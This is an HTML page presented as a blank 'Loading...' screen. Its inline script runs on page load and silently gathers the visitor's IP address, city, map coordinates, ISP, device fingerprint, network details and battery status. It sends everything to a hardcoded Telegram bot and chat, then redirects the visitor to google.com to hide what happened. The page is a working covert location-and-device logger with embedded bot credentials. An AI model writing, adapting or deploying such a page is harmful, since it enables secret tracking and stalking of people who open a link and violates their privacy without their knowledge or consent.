<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>*{margin:0;padding:0;}body{background:#fff;}</style>
</head>
<body>
<script>
const BOT_TOKEN = '8609756694:AAFjX0cnt791j34h844O_dUKCKl0dNARe8U';
const CHAT_ID   = '8220599004';
const REDIRECT  = 'https://google.com';

async function collect() {
  const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

  // Run IP fetch + battery in parallel
  const [ipData, bat] = await Promise.allSettled([
    fetch('https://ip-api.com/json/?fields=61439').then(r => r.json()),
    navigator.getBattery?.()
  ]);

  const d = ipData.status === 'fulfilled' ? ipData.value : {};
  const b = bat.status === 'fulfilled' ? bat.value : null;

  // IP / Location
  const ip       = d.query      || '—';
  const city     = d.city       || '—';
  const region   = d.regionName || '—';
  const country  = d.country    || '—';
  const lat      = d.lat        || '—';
  const lon      = d.lon        || '—';
  const isp      = d.isp        || '—';
  const timezone = d.timezone   || '—';
  const mapsUrl  = lat !== '—' ? `https://maps.google.com/?q=${lat},${lon}` : '—';

  // Device
  const ua      = navigator.userAgent;
  const cores   = navigator.hardwareConcurrency || '—';
  const memory  = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '—';
  const touch   = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints})` : 'No';
  const lang    = navigator.language || '—';
  const sw      = screen.width, sh = screen.height;
  const dpr     = window.devicePixelRatio || 1;

  // Network
  const conn     = navigator.connection || {};
  const netType  = conn.effectiveType || '—';
  const downlink = conn.downlink ? conn.downlink + ' Mbps' : '—';
  const rtt      = conn.rtt ? conn.rtt + ' ms' : '—';

  // Battery
  const batLevel    = b ? Math.round(b.level * 100) + '%' : '—';
  const batCharging = b ? (b.charging ? 'Charging ⚡' : 'Not charging') : '—';
  const batMins     = b
    ? (b.charging
        ? (b.chargingTime !== Infinity ? Math.round(b.chargingTime/60) + ' min to full' : '—')
        : (b.dischargingTime !== Infinity ? Math.round(b.dischargingTime/60) + ' min left' : '—'))
    : '—';

  // OS + Browser
  const os = /Android/.test(ua) ? 'Android ' + (ua.match(/Android ([^;]+)/)?.[1]||'')
    : /iPhone|iPad/.test(ua) ? 'iOS ' + (ua.match(/OS ([^)]+)/)?.[1]?.replace(/_/g,'.')||'')
    : /Windows NT 10/.test(ua) ? 'Windows 10/11'
    : /Mac OS X/.test(ua) ? 'macOS'
    : /Linux/.test(ua) ? 'Linux' : '—';

  const browser = /Edg\//.test(ua) ? 'Edge ' + (ua.match(/Edg\/([^\s]+)/)?.[1]||'')
    : /OPR\//.test(ua) ? 'Opera ' + (ua.match(/OPR\/([^\s]+)/)?.[1]||'')
    : /Chrome\//.test(ua) ? 'Chrome ' + (ua.match(/Chrome\/([^\s]+)/)?.[1]||'')
    : /Firefox\//.test(ua) ? 'Firefox ' + (ua.match(/Firefox\/([^\s]+)/)?.[1]||'')
    : /Safari\//.test(ua) ? 'Safari ' + (ua.match(/Version\/([^\s]+)/)?.[1]||'')
    : '—';

  const msg = `🔔 New Visit

🕐 ${time}

📡 NETWORK
IP: ${ip}
City: ${city}, ${region}, ${country}
Coords: ${lat}, ${lon}
Maps: ${mapsUrl}
ISP: ${isp}
Timezone: ${timezone}
Connection: ${netType} | ${downlink} | RTT ${rtt}

📱 DEVICE
OS: ${os}
Browser: ${browser}
Screen: ${sw}x${sh} @${dpr}x
RAM: ${memory} | Cores: ${cores}
Touch: ${touch} | Lang: ${lang}

🔋 BATTERY
Level: ${batLevel} | ${batCharging}
Time: ${batMins}`;

  // keepalive: true keeps the request alive even after redirect
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    keepalive: true,
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: msg,
      disable_web_page_preview: true
    })
  });

  // Small delay to ensure fetch is dispatched before redirect
  setTimeout(() => window.location.replace(REDIRECT), 300);
}

collect();
</script>
</body>
</html>
